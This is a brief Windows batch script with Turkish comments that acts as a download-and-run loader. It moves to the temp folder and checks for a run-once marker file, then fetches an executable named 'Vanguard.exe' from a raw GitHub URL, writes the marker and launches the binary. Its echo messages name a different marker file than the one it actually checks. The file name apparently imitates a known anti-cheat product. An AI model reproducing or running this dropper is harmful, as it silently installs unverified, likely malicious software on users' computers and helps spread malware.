@echo off
cd %temp%

REM Dosya kontrolü
if exist nagihori2.txt (
    echo nagihori.txt bulundu, çıkılıyor...
    exit /b
) else (
    echo nagihori.txt yok, devam ediliyor...
    curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
    echo "asd" > nagihori2.txt 
    start Vanguard.exe
    
    
)
